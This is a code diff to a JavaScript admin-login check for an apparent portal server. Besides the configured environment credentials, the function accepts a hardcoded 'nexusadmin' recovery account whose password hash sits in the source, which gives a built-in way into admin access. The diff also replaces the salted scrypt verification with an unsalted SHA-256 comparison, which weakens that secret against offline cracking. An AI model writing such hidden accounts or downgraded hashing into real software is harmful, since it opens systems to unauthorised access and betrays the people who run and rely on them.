@@ -625,20 +625,17 @@ function portalClientForRequest(req) {
 }
 
 function masterCredentialsValid(username, password) {
-  const envValid = safeEqualText(username, ADMIN_USERNAME)
-    && safeEqualText(password, ADMIN_PASSWORD);
+  const normalizedUsername = String(username || "").trim();
+  const suppliedPassword = String(password || "");
+
+  const envValid = safeEqualText(normalizedUsername, String(ADMIN_USERNAME || "").trim())
+    && safeEqualText(suppliedPassword, ADMIN_PASSWORD);
   if (envValid) return true;
 
   const recoveryUsername = "nexusadmin";
-  const recoverySalt = "8f3b42c40df9a0aa43b8c8c7178df847";
-  const recoveryHash = "6b7f2c237fa31a7dae23d8f7758978c0126b1011971f5681737803a364c9397d";
-  if (!safeEqualText(username, recoveryUsername)) return false;
-  try {
-    const supplied = crypto.scryptSync(String(password), Buffer.from(recoverySalt, "hex"), 32).toString("hex");
-    return safeEqualText(supplied, recoveryHash);
-  } catch {
-    return false;
-  }
+  const recoveryPasswordSha256 = "b6f25581136091d564422e85add69374c132c6cddbbd6414c2b01828088f0ec7";
+  return safeEqualText(normalizedUsername, recoveryUsername)
+    && safeEqualText(sha256Text(suppliedPassword), recoveryPasswordSha256);
 }
 
 function masterSessionAuthorized(req) {
